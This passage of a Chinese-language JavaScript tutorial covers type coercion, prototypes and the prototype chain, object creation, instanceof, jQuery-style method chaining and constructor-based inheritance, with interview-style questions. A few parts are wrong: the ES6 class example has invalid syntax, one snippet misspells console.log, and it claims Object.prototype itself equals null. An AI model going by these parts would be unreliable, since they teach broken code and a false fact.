class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> + <span class="string">'2'</span> = <span class="number">12</span>; <span class="comment">// 数字会先转换成字符串</span></span><br><span class="line"><span class="number">6</span> / <span class="string">'2'</span> = <span class="number">3</span>;</span><br><span class="line"><span class="string">'6'</span> / <span class="number">2</span> = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line"><span class="number">2</span> - <span class="string">'1'</span> = <span class="number">1</span>; <span class="comment">// 字符串会先转换成数字</span></span><br><span class="line"><span class="string">'2'</span> - <span class="number">1</span> = <span class="number">1</span>;</span><br><span class="line"><span class="number">2</span> * <span class="string">'3'</span> = <span class="number">6</span>;</span><br><span class="line"></span><br><span class="line"><span class="number">1</span> + <span class="literal">true</span> = <span class="number">2</span>;</span><br><span class="line"><span class="number">1</span> + <span class="literal">false</span> = <span class="number">1</span>;</span><br><span class="line"><span class="number">1</span> + <span class="literal">undefined</span> = <span class="literal">NaN</span>;</span><br><span class="line"><span class="number">1</span> + <span class="literal">null</span> = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="number">10</span> &amp;&amp; <span class="number">0</span>; <span class="comment">// 0</span></span><br><span class="line"><span class="string">''</span> || <span class="string">'abc'</span>; <span class="comment">// abc</span></span><br><span class="line">!<span class="built_in">window</span>.abc; <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="literal">undefined</span> == <span class="literal">null</span>; <span class="comment">// true</span></span><br><span class="line"><span class="literal">null</span> == <span class="literal">false</span>; <span class="comment">// true</span></span><br><span class="line"><span class="literal">undefined</span> == <span class="literal">false</span>; <span class="comment">// true</span></span><br><span class="line"><span class="string">'0'</span> == <span class="number">0</span>; <span class="comment">// true</span></span><br><span class="line"><span class="number">0</span> == <span class="literal">false</span>; <span class="comment">// true</span></span><br><span class="line"><span class="string">'0'</span> == <span class="literal">false</span>; <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 拓展：判断一个变量会被当做 true 还是 false</span></span><br><span class="line"><span class="keyword">var</span> a = <span class="number">100</span>;</span><br><span class="line"><span class="built_in">console</span>.log(!!a);</span><br></pre></td></tr></table></figure></li><li><p>判断语句<br><code>if</code> 语句其中的判断条件会进行类型的转换</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (some) &#123;&#125;</span><br><span class="line"><span class="comment">// 等效于</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">Boolean</span>(some)) &#123;&#125;</span><br></pre></td></tr></table></figure></li></ol><hr><h2 id="原型链"><a href="#原型链" class="headerlink" title="原型链"></a>原型链</h2><h3 id="创建对象的几种方式"><a href="#创建对象的几种方式" class="headerlink" title="创建对象的几种方式"></a>创建对象的几种方式</h3><p>  1、字面量法<br>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> o1 = &#123;<span class="attr">name</span>: <span class="string">'o1'</span>&#125;;</span><br></pre></td></tr></table></figure></p><p>  2、构造函数法（构造函数首字母大写）<br>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> o2 = <span class="keyword">new</span> <span class="built_in">Object</span>(&#123;<span class="attr">name</span>: <span class="string">'o2'</span>&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> M = <span class="function"><span class="keyword">function</span> (<span class="params">name</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = name;</span><br><span class="line">  <span class="comment">// return this // 默认有这一行</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> o3 = <span class="keyword">new</span> M(<span class="string">'o3'</span>); <span class="comment">// 实例</span></span><br></pre></td></tr></table></figure></p><p>  3、Object.create()法<br>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> o4 = <span class="built_in">Object</span>.create(&#123;<span class="attr">name</span>: <span class="string">'o4'</span>&#125;);</span><br></pre></td></tr></table></figure></p><p>  以上的运行结果如下：<br>  <img src="../images/javascript/js_object_result.png" width="60%" title="几种创建对象的运行结果"></p><p>  我们看到o3和o4的运行结果有些不一样，o3前面的M表示构造函数，o4却不显示属性</p><p>  但是运行<code>o4.name</code>发现其实是有值的，具体原因参考：<a href="https://www.cnblogs.com/leijee/p/7490822.html" target="_blank" rel="noopener">leijee blog</a><br>  <img src="../images/javascript/js_object_result2.png" width="60%" title=""></p><p>  1其实是2的一个语法糖，如果要创建一个空对象<br>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> o1 = &#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> o2 = <span class="keyword">new</span> <span class="built_in">Object</span>();</span><br><span class="line"><span class="keyword">var</span> o3 = <span class="built_in">Object</span>.create(&#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> o4 = <span class="built_in">Object</span>.create(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure></p><p>  只有o4是没有 <code>__proto__</code> 属性的，它没有继承 Object.prototype 原型链上的属性或者方法,例如：<code>toString()</code>, <code>hasOwnProperty()</code>等方法</p><h3 id="构造函数扩展"><a href="#构造函数扩展" class="headerlink" title="构造函数扩展"></a>构造函数扩展</h3><ol><li><code>var arr = []</code> 其实是 <code>var a = new Array()</code> 的语法糖；</li><li><code>var obj = {}</code> 其实是 <code>var a = new Object()</code> 的语法糖；</li><li><code>function Foo(){}</code> 其实是 <code>var Foo = new Function(){}</code>；</li></ol><p>即 arr 的构造函数是 <code>Array</code>, obj 的构造函数是 <code>Object</code>，Foo 的构造函数是 <code>Function</code>。</p><h3 id="原型规则"><a href="#原型规则" class="headerlink" title="原型规则"></a>原型规则</h3><ul><li><p>规则1：所有的引用类型（数组、对象、函数），都具有对象特性，可自由扩展属性（null 除外）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line">obj.a = <span class="number">100</span>; <span class="comment">// &#123;a: 100&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> arr = [];</span><br><span class="line">arr.a = <span class="number">100</span>; <span class="comment">// [a: 100]</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params"></span>)</span>&#123;&#125;;</span><br><span class="line">fn.a = <span class="number">100</span>;</span><br></pre></td></tr></table></figure></li><li><p>规则2：所有的引用类型（数组、对象、函数），都有一个 <code>__proto__</code> (隐式原型) 属性，属性值是一个普通的对象</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(obj.__proto__);</span><br><span class="line"><span class="built_in">console</span>.log(arr.__proto__);</span><br><span class="line"><span class="built_in">console</span>.log(fn.__proto__);</span><br></pre></td></tr></table></figure><p>结果如下图：<br><img src="../images/javascript/js__proto__.png" width="80%" title="__proto__属性"></p></li></ul><ul><li><p>规则3：所有的函数，都有一个 <code>prototype</code> (显示原型) 属性，属性值是一个普通的对象</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(fn.prototype); <span class="comment">// &#123;constructor: ƒ&#125;</span></span><br></pre></td></tr></table></figure></li><li><p>规则4：所有的引用类型（数组、对象、函数），<code>__proto__</code> (隐式属性) 属性值指向它的构造函数的 <code>prototype</code> (显示原型) 属性值</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(obj.__proto__ === <span class="built_in">Object</span>.prototype); <span class="comment">// true</span></span><br><span class="line"><span class="built_in">console</span>.log(arr.__proto__ === <span class="built_in">Array</span>.prototype); <span class="comment">// true</span></span><br><span class="line"><span class="built_in">console</span>.log(fn.__proto__ === <span class="built_in">Function</span>.prototype); <span class="comment">// true</span></span><br></pre></td></tr></table></figure></li><li><p>规则5：当试图得到一个对象的某个属性时，如果这个对象本身没有这个属性，那么会去它的 <code>__proto__</code>（即它的构造函数的 <code>prototype</code>）中去寻找，如果一层没有找到，就继续往上查找，一直到 <code>Object.prototype</code> 为止。因为 <code>Object.prototype</code> 等于 <code>null</code> 会自动停止。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 构造函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Foo</span>(<span class="params">name, age</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 扩展属性（规则1）</span></span><br><span class="line">Foo.prototype.alertName = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  alert(<span class="keyword">this</span>.name);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建一个实例f</span></span><br><span class="line"><span class="keyword">var</span> f = <span class="keyword">new</span> Foo(<span class="string">'zhangsan'</span>);</span><br><span class="line"><span class="comment">// 扩展属性（规则1）</span></span><br><span class="line">f.printName = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="keyword">this</span>.name);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试</span></span><br><span class="line">f.printName();</span><br><span class="line">f.alertName(); <span class="comment">// (规则5)</span></span><br><span class="line"><span class="comment">// f本身没有 alertName 属性，它会去它自身的隐式原型 即f.__proto__ (也即是它的构造函数的显示原型 Foo.prototype)中去寻找这个属性</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f.toString(); <span class="comment">// (规则5)</span></span><br><span class="line"><span class="comment">// f本身没有 toString 属性，它会去它自身的隐式原型 即f.__proto__ (也即是它的构造函数的显示原型 Foo.prototype)中去寻找这个属性</span></span><br><span class="line"><span class="comment">// 但是 Foo.prototype 中并没有找到这个属性，但是因为 Foo.prototype 本身也是一个对象，所以会继续向上寻找，Foo.prototype 的构造函数是 Object</span></span><br><span class="line"><span class="comment">// 即去 f.__proto__.__proto__中查找，也即是 Object.prototype 中查找，最终发现了toString</span></span><br><span class="line"></span><br><span class="line">f.__proto__ === Foo.prototype; <span class="comment">// true</span></span><br><span class="line">f.__proto__.__proto__ === <span class="built_in">Object</span>.prototype; <span class="comment">// true</span></span><br></pre></td></tr></table></figure><p><img src="../images/javascript/js_prototype2.png" width="100%" title="原型链图解"></p></li></ul><h3 id="循环对象自身的属性"><a href="#循环对象自身的属性" class="headerlink" title="循环对象自身的属性"></a>循环对象自身的属性</h3><p>对于上例，循环f自身的属性：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> item <span class="keyword">in</span> f) &#123;</span><br><span class="line">  <span class="keyword">if</span> (f.hasOwnProperty(item)) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(item);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// name</span></span><br><span class="line"><span class="comment">// printName</span></span><br></pre></td></tr></table></figure></p><h3 id="instanceof"><a href="#instanceof" class="headerlink" title="instanceof"></a>instanceof</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">f <span class="keyword">instanceof</span> Foo; <span class="comment">// f是否是Foo的一个实例</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断逻辑是：</span></span><br><span class="line"><span class="comment">// f的 __proto__ 一层一层往上，能否对应到 Foo.prototype，结果为true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 同理：</span></span><br><span class="line">f <span class="keyword">instanceof</span> <span class="built_in">Object</span>; <span class="comment">// f是否是Object的一个实例，结果为true</span></span><br></pre></td></tr></table></figure><h3 id="构造函数、原型对象、实例、原型链关系网"><a href="#构造函数、原型对象、实例、原型链关系网" class="headerlink" title="构造函数、原型对象、实例、原型链关系网"></a>构造函数、原型对象、实例、原型链关系网</h3><p>  关系网如下：<br>  <img src="../images/javascript/js_prototype.png" width="100%" title="构造函数、原型对象、实例、原型链关系网"><br>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> M = <span class="function"><span class="keyword">function</span> (<span class="params">name</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = name;</span><br><span class="line">&#125;; <span class="comment">// 构造函数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> o3 = <span class="keyword">new</span> M(<span class="string">'o3'</span>); <span class="comment">// 实例o3</span></span><br><span class="line"><span class="keyword">var</span> o4 = <span class="keyword">new</span> M(<span class="string">'o4'</span>); <span class="comment">// 实例o4</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// M: 是一个构造函数，任何普通函数在使用new运算符之后都变成构造函数</span></span><br><span class="line"><span class="comment">// o3、o4: 实例</span></span><br><span class="line"><span class="comment">// M.prototype: 原型对象</span></span><br><span class="line"><span class="comment">// M.prototype.constructor: 原型对象的构造器，M.prototype.constructor === M</span></span><br><span class="line"><span class="comment">// o3.__proto__: 实例的__prto__属性，o3.__proto__ === M.prototype</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 实际上函数也有__proto__属性，M.__proto__ === Function.prototype，这个逻辑说明M构造函数是Function的一个实例</span></span><br></pre></td></tr></table></figure></p><p>  <img src="../images/javascript/js_prototype_result.png" width="60%" title="构造函数、原型对象、实例、原型链"></p><h3 id="面试题：写一个原型链继承的demo"><a href="#面试题：写一个原型链继承的demo" class="headerlink" title="面试题：写一个原型链继承的demo"></a>面试题：写一个原型链继承的demo</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 父类</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">A</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = <span class="string">'test name'</span>;</span><br><span class="line">&#125;</span><br><span class="line">A.prototype.getName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 子类B</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">B</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.age = <span class="number">12</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// B继承A</span></span><br><span class="line">B.prototype = <span class="keyword">new</span> A();</span><br><span class="line">B.prototype.getAge = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.age;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 子类C</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">C</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.sex = <span class="string">'male'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// C继承B</span></span><br><span class="line">C.prototype = <span class="keyword">new</span> B();</span><br><span class="line">C.prototype.getSex = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.sex;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建实例（abc是C的实例，C继承B，B继承A，所以abc可以调用A、B、C的方法）</span></span><br><span class="line"><span class="keyword">var</span> abc = <span class="keyword">new</span> C();</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(abc.getSex()); <span class="comment">// male</span></span><br><span class="line"><span class="built_in">console</span>.log(abc.getAge()); <span class="comment">// 12</span></span><br><span class="line"><span class="built_in">console</span>.log(abc.getName()); <span class="comment">// test name</span></span><br></pre></td></tr></table></figure><p>打印 <code>console.dir(abc);</code></p><p><img src="../images/javascript/js_prototype3.png" width="80%" title="多次继承的实例输出图"><br>从图中我们可以看出，通过 <code>prototype</code> 扩展的属性会挂载在 <code>__proto__</code> 属性下，通过 <code>hasOwnProperty</code> 方法可过滤扩展的属性<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">abc.hasOwnProperty(<span class="string">'sex'</span>); <span class="comment">// true</span></span><br><span class="line">abc.hasOwnProperty(<span class="string">'getSex'</span>); <span class="comment">// false</span></span><br></pre></td></tr></table></figure></p><p>我们可以打印一下隐式原型 <code>__proto__</code> 和显式原型 <code>prototype</code> 的关系图<br><img src="../images/javascript/js_prototype4.png" width="80%" title="隐式原型__proto__和显式原型的关系"></p><p>打印 <code>console.log(abc.prototype)</code>，输出为 <code>undefined</code>，我们可以知道，实例是没有 <code>prototype</code> 属性的</p><h3 id="面试题：写一个实际应用中使用原型链的例子"><a href="#面试题：写一个实际应用中使用原型链的例子" class="headerlink" title="面试题：写一个实际应用中使用原型链的例子"></a>面试题：写一个实际应用中使用原型链的例子</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 实现类似jquery html()和on(event, fn)方法</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Elem</span>(<span class="params">id</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.elem = <span class="built_in">document</span>.getElementById(id);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 扩展一个设置html内容的方法</span></span><br><span class="line">Elem.prototype.html = <span class="function"><span class="keyword">function</span>(<span class="params">val</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> elem = <span class="keyword">this</span>.elem;</span><br><span class="line">  <span class="keyword">if</span>(val) &#123;</span><br><span class="line">    elem.innerHTML = val;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>; <span class="comment">// 链式操作</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> elem.innerHTML;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 扩张一个事件绑定的方法</span></span><br><span class="line">Elem.prototype.on = <span class="function"><span class="keyword">function</span>(<span class="params">type, fn</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> elem = <span class="keyword">this</span>.elem;</span><br><span class="line">  elem.addEventListener(type, fn);</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>; <span class="comment">// 链式操作</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> div1 = <span class="keyword">new</span> Elem(<span class="string">'div1'</span>);</span><br><span class="line"><span class="comment">// console.log('div1');</span></span><br><span class="line">div1.html(<span class="string">'&lt;p&gt;hello word&lt;/p&gt;'</span>); <span class="comment">// 设置html内容</span></span><br><span class="line">div1.on(<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; <span class="comment">// 绑定一个点击事件</span></span><br><span class="line">  alert(<span class="string">'clicked'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 我们在扩展html方法的时候写了一个 return this返回这个实例，就可以实现类似jquery链式操作的功能</span></span><br><span class="line">div1.html(<span class="string">'&lt;p&gt;hello word&lt;/p&gt;'</span>).on(<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; <span class="comment">// 绑定一个点击事件</span></span><br><span class="line">  alert(<span class="string">'clicked'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 因为我们在每个扩展的方法里面都写了一个return this，所以链式操作的顺序可以调换</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 甚至我们可以重复调用多次扩展的方法</span></span><br><span class="line">div1.html(<span class="string">'&lt;p&gt;hello word&lt;/p&gt;'</span>).html(<span class="string">'&lt;p&gt;Hello Word&lt;/p&gt;'</span>);</span><br></pre></td></tr></table></figure><h3 id="面试题：描述-new-一个对象的过程"><a href="#面试题：描述-new-一个对象的过程" class="headerlink" title="面试题：描述 new 一个对象的过程"></a>面试题：描述 new 一个对象的过程</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Foo</span>(<span class="params">name, age</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = name;</span><br><span class="line">  <span class="keyword">this</span>.age = age;</span><br><span class="line">  <span class="comment">// return this;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> f = <span class="keyword">new</span> Foo(<span class="string">'zhangsan'</span>, <span class="number">18</span>);</span><br></pre></td></tr></table></figure><ol><li>创建一个对象f</li><li><code>this</code> 指向这个新对象</li><li>执行代码，即对 <code>this</code> 赋值</li><li>返回 <code>this</code>，内部会有一句默认的 <code>return this</code></li></ol><hr><h2 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h2><h3 id="定义类"><a href="#定义类" class="headerlink" title="定义类"></a>定义类</h3><ol><li><p>ES5</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Animal</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Animal(<span class="string">'dog'</span>); <span class="comment">// Animal &#123;name: "dog"&#125;  注：如果不传参数是，括号可省略</span></span><br></pre></td></tr></table></figure></li><li><p>ES6 class</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal2</span>(<span class="title">name</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Animal2(<span class="string">'cat'</span>); <span class="comment">// Animal2 &#123;name: "cat"&#125;</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h3><h4 id="借助构造函数实现简单继承"><a href="#借助构造函数实现简单继承" class="headerlink" title="借助构造函数实现简单继承"></a>借助构造函数实现简单继承</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Parent1</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = <span class="string">'parent1'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Child1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  Parent1.call(<span class="keyword">this</span>); <span class="comment">// 也可使用apply</span></span><br><span class="line">  <span class="keyword">this</span>.type = <span class="string">'child1'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Parent1(); <span class="comment">// Parent1 &#123;name: "parent1"&#125;</span></span><br><span class="line"><span class="keyword">new</span> Child1(); <span class="comment">// Child1 &#123;name: "parent1", type: "child1"&#125;</span></span><br></pre></td></tr></table></figure><p>  <strong>构造函数继承的弊端</strong>：如果父类的原型对象上还有方法，无法继承。即无法继承 <code>prototype</code> 创建的方法，如：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Parent1</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = <span class="string">'parent1'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 如果有这种原型对象上的方法，则无法继承</span></span><br><span class="line">Parent1.prototype.say = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  conole.log(<span class="string">'say'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Child1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  Parent1.call(<span class="keyword">this</span>); <span class="comment">// 也可使用apply</span></span><br><span class="line">  <span class="keyword">this</span>.type = <span class="string">'child1'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span 